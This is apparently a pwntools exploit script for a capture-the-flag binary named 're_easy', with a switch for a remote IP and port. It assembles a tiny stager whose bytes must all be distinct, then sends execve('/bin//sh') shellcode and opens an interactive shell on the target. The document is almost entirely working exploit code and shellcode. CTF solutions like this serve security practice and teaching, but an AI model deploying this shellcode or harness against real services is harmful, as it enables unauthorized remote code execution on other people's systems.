import struct
import random

from pwn import *
from pwnlib import util

from keystone import *

REMOTE = False

if REMOTE:
  p = remote('52.69.40.204', 8361)
else:
  p = process("re_easy")

ks = Ks(KS_ARCH_X86, KS_MODE_64)

print p.recv()

# this drops rip into rcx
encoding, n = ks.asm("syscall; mov rdx, rcx; jmp -7")

print "Shellcode size: {}".format(len(encoding))

#from pdb import set_trace
#set_trace()

assert(len(encoding) < 0x18)

# print "pid: {}".format(p.pid)

# input("Press enter to begin...")

print "running: {}".format([hex(b) for b in encoding])

for e in encoding:
  if encoding.count(e) > 1:
    print "{} occurs multiple times!".format(hex(e))
    exit(1)

payload = "".join(chr(e) for e in encoding)

shencoding, n = ks.asm("add rsp, 0x100; xor rax, rax; xor rsi, rsi; mul esi; push rax; mov rdi, 0x68732f2f6e69622f; push rdi; mov rdi, rsp; mov al, 0x3b; syscall")

shpayload = "".join(chr(e) for e in shencoding)

bumpenc, n = ks.asm("add rsp, 0x1000")
shbump = "".join(chr(e) for e in bumpenc)

with open('payload', 'w') as f:
     f.write(payload)

print payload

p.send(payload)

print p.recv()

p.send(shpayload)

p.interactive()


